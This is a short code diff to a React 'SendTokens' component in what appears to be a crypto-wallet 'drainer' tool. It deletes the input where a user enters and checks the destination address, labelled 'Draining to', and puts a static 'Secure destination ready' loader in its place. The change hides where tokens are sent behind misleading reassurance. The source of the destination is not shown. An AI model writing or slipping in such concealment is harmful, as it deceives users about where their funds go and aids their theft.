@@ -228,30 +228,15 @@ export const SendTokens = () => {
   );
   const usdLabel = usdFormatter.format(checkedUsd);
 
-  const addressState = addressAppearsValid
-    ? 'success'
-    : destinationAddress.length > 0
-      ? 'warning'
-      : 'default';
-
   return (
     <div className="panel send">
-      <div className="field">
-        <label className="field__label" htmlFor="drain-destination">
-          Draining to
-        </label>
-        <input
-          id="drain-destination"
-          className="address-input"
-          required
-          value={destinationAddress}
-          placeholder="vitalik.eth"
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          data-state={addressState}
-          spellCheck={false}
-          autoCapitalize="off"
-          autoCorrect="off"
-        />
+      <div className="field destination-status" aria-live="polite">
+        <span className="field__label">Destination</span>
+        <div className="destination-loader">
+          <span className="destination-loader__ring" aria-hidden="true" />
+          <span>Secure destination ready</span>
+          <span className="destination-loader__pulse" aria-hidden="true" />
+        </div>
       </div>
 
       <div className="drain-summary">
